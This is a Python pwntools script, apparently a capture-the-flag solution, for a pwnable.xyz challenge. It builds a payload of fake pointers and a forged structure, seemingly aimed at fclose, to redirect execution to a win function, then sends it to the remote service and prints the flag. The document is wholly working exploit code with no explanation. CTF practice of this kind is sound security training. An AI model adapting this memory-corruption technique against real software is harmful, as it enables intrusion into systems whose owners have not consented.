from pwn import *

win = 0x4007ec
input_ = 0x601260
# p = process('./challenge')
p = remote('svc.pwnable.xyz', 30018)
# gdb.attach(p, '''b *0x400836
# b *_IO_new_fclose''')

p.recvuntil('>')

exploit = ''
exploit += p64(0x8000)
exploit += p64(win)
exploit += 'A'*0x78
exploit += p64(0x601670)
exploit += 'A'*(0xd8-len(exploit))
exploit += p64(input_ + 0x8 - 0x10)
exploit += 'A'*(0x404-len(exploit))
p.send(exploit)	

print p.recvuntil('}')
